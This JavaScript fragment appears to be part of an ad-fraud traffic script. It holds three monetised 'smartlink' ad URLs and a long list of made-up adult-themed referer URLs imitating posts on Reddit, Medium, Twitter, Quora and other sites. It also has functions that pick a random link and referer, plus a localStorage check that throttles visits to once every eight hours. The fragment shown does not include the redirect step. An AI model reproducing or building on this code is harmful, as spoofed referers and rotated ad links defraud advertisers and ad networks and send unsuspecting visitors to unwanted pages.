
const smartlinks = ['https://shyplan.com/jiDaJc',
 'https://otieu.com/4/9569226',
    'https://www.profitableratecpm.com/gcwpbm2im?key=3745b60b814251e205062113bf24c921'];
const referers = [
  "https://hot-blogger.com/forbidden-story",
    "https://naughtyzone.blogspot.com/post/intimate-secret",
  "https://medium.com/@nsfwwriter/cheating-wife-confession",
  "https://quora.com/topic/Adult-Confessions",
  "https://reddit.com/r/sexystories/comments/xxx123/true_affair_story/",
  "https://twitter.com/adultfeed/status/9827384",
  "https://t.me/share/url?url=nsfwvideo.club",
"https://bit.ly/hot-mature-links",
  "https://linktr.ee/adultcontentvault",
  "https://tinyurl.com/nsfw-videos-2025",
  "https://facebook.com/groups/only18plusclub",
  "https://pornstoriesdaily.blogspot.com/2024/03/stepmom-fantasy.html",
  "https://xhub.pro/blog/hot-housewife",
  "https://adultforum.net/thread/secret-lover-diary",
  "https://tumblr.com/nsfwarchive/post456",
  "https://onlyfansleakzone.site/milf-diary",
"https://bit.do/adult-entry-link",
  "https://hotreads.net/story/office-affair",
  "https://twitter.com/erotic_world18/status/9743750",
  "https://medium.com/@nudejournal/college-girl-hookup",
"https://quora.com/q/hottalk",
  "https://pornoforum.cc/thread/slutty-sister",
  "https://anonfiles.com/adult_story123",
  "https://nsfwlinktree.site/hidden-xxx-links",
  "https://naughtyhub.xyz/roommate-secrets",
  "https://docs.google.com/document/d/dirty-diary",
"https://t.co/adultlink_2024",
"https://bitly.ws/hotconfession",
  "https://instagram.com/highlights/dirtytalk18",
  "https://ko-fi.com/post/adult-link-exchange",
"https://dood.la/steamy-video-here",
  "https://telegram.org/share?url=leakedcontent.pro",
"https://tiny.cc/hub18access",
"https://s.id/steamycollection",
  "https://unlockedfiles.click/nsfwzone",
  "https://webcache.googleusercontent.com/link?u=private18.club",
"https://pastebin.com/NSFWref2025",
  "https://docs.google.com/spreadsheets/d/adult-access",
  "https://hornytumblr.tumblr.com/p/post123",
"https://s.id/unlockedadultlinks",
  "https://sociabuzz.com/onlyforadults",
  "https://privateleaks.org/mature-zone",
  "https://reddit.com/r/nsfwcorner/posts/5566",
  "https://facebook.com/story.php?story_fbid=adultshare",
  "https://bit.ly/mommy-confession-link",
  "https://karyakarsa.com/dirtydiary/ep1",
"https://wa.me/?text=hotzone.net",
"https://steamy.link/daily-erotica",
"https://link.xxxhub.click",
  "https://linkvault.net/18onlyvideos",
"https://shorturl.at/hotentrypage",
  "https://safeadult.host/confession-room",
"https://shortzone.link/xxx-story",
  "https://twitter.com/privateclips18",
"https://quora.com/q/eroticdiary",
"https://fb.watch/naughtyclip/",
  "https://docs.google.com/forms/d/hookup-request-form",
  "https://groups.google.com/g/adult-drops",
"https://xnxxfiles.net/enter-now",
"https://rebrand.ly/entry18",
"https://bio.site/erotic-landing",
  "https://t.me/joinchat/hotclubglobal",
  "https://medium.com/@eroticthoughts/teacher-affair-secret",
  "https://twitter.com/hotwife_community/status/8899123",
"https://bit.ly/hidden-room-xxx",
"https://rentry.co/naughtypageid",
  "https://cloudflare-ipfs.com/ipfs/nsfwentrypage",
  "https://adultworld.net/blog/milf-fantasy-story",
  "https://bloggereroticworld.blogspot.com/2025/01/his-landlady.html",
  "https://naughty-archives.my.id/story/girlfriend-sister",
  "https://onlylinks.cc/zoneofpleasure",
  "https://l.instagram.com/?u=steamyfiles.net",
  "https://adultzone.storage.googleapis.com/index.html",
  "https://quora.com/topic/18-Safe-Entry",
"https://nudezone.web.app/start",
"https://paste.ee/p/nsfwarchive123",
"https://bio.link/hotworldaccess",
  "https://naughtysplash.page.link/private-vault",
  "https://tiktok.com/@secret18id/video/445511",
  "https://twitter.com/fantasyzone2025",
  "https://anonfiles.com/folder/adult-links",
  "https://xvideosmirror.cc/hiddenpage",
  "https://tinyurl.com/purepleasure2025",
  "https://diaryzone.tumblr.com/post/hidden-milf-fantasy",
  "https://only18hub.com/post/his-stepsister",
"https://notion.so/adultvault",
"https://prnt.sc/nsfwlink_access",
  "https://linktree.com/eroticlibrary",
  "https://spicyjournal.blogspot.com/story/his-wife-and-her-boss",
  "https://drive.google.com/file/d/dirty_clip_collection",
  "https://communityboard.net/group/erotic-share",
  "https://ko-fi.com/post/folder-of-leaked-content",
  "https://hot-link.pages.dev/late-night-fantasy",
  "https://cdn-private-links.glitch.me/entrypage",
  "https://kaskus.co.id/thread/hotclipdaily",
"https://bio.site/privatevault18",
"https://linkbio.co/nsfw-indonesia",
"https://intimatex.web.app/access"
];

function getRandomSmartlink() {
  return smartlinks[Math.floor(Math.random() * smartlinks.length)];
}

function getRandomReferer() {
  return referers[Math.floor(Math.random() * referers.length)];
}

function hasVisitedRecently() {
  const lastVisit = localStorage.getItem('lastVisit');
  if (!lastVisit) return false;
  const lastTime = new Date(parseInt(lastVisit));
  const now = new Date();
  const hoursPassed = (now - lastTime) / 36e5;
  return hoursPassed < 8;
}

function saveVisitTime() {
  localStorage.setItem('lastVisit', Date.now().toString());
}
